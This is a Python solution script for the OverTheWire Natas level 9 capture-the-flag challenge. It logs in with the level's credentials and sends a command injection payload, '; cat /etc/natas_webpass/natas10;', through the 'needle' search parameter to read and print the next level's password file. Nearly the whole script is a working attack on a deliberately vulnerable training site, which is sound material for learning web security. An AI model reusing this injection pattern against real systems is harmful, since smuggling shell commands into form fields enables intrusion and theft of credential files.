# Vulnerability: Command Injection

import requests
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Command Injection Payload
params = {"needle": "; cat /etc/natas_webpass/natas10;", "submit": "Whatever?"}


# Make a GET request to the URL with basic authentication using the provided credentials & parameters
resp = requests.get(url=url, auth=(username, password), params=params)


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')


# Extract password for the next level
print(f"Natas 10: {soup.find('pre').text.strip()}")
